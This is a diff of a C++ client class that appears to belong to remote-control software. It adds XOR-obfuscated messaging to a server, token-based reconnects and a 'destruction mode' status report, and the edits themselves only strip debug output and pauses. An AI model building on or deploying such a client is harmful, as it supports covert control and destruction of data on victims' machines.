@@ -51,8 +51,6 @@ int Connexion::openConnexion()
 
 int Connexion::main()
 {   
-
-    //int i=0;
     string command,status;
     vector <string> result;
 
@@ -75,7 +73,7 @@ int Connexion::main()
         if(command.find("is_life?") != string::npos)
         {
             ;
-            //cout << "is life find baby" << endl; // if find is_life then continue
+            //if find is_life then continue
         }
         else
         {
@@ -162,12 +160,10 @@ int Connexion::main()
                     //If error
                     //string name_user = "MOD_HANDSHAKE_NAME_USER"  SPLIT + a_name_user;
                     status = "MOD_DESTRUCTION:" SPLIT + (string)"True";// "[-] An error occurred while executing the destroy mode.";
-                    cout << "statuts: " << status << endl;
                 }
                 else
                 {
                     status = "MOD_DESTRUCTION:" SPLIT + (string)"False";//"[+] The destruction mode is executed successfully.";
-                    cout << "statuts: " << status << endl;
                 }  
 
 
@@ -192,7 +188,7 @@ int Connexion::main()
                 else
                 {
                     cout << "Not error bye... " << endl;
-                    system("pause");
+                    //system("pause");
                     closeConnexion();
                     exit(0);
                 }
@@ -281,10 +277,8 @@ Once the function is finished send "\r\n" to signal to the server that the clien
         }
     }
 
-    else
+    else //if one request
     {
-        //cout << "singel request..." << endl;
-        //cout << "size of request: " << result_of_command[i].length() << endl;
         request = result_of_command[0];
 
         iResult = send(sock_client, XOREncryption(request).c_str(), request.length(),0);
@@ -331,13 +325,11 @@ void Connexion::reConnect()
     //if the client has a token then reconnects without handshaking
 
     closeConnexion();
-
     openConnexion();
 
     request = ("MOD_RECONNECT" SPLIT  +a_token);
-
+    
     sendUltraSafe(sock_client, XOREncryption(request)); //send token
-
     sendUltraSafe(sock_client, XOREncryption("\r\n"));
 }
 
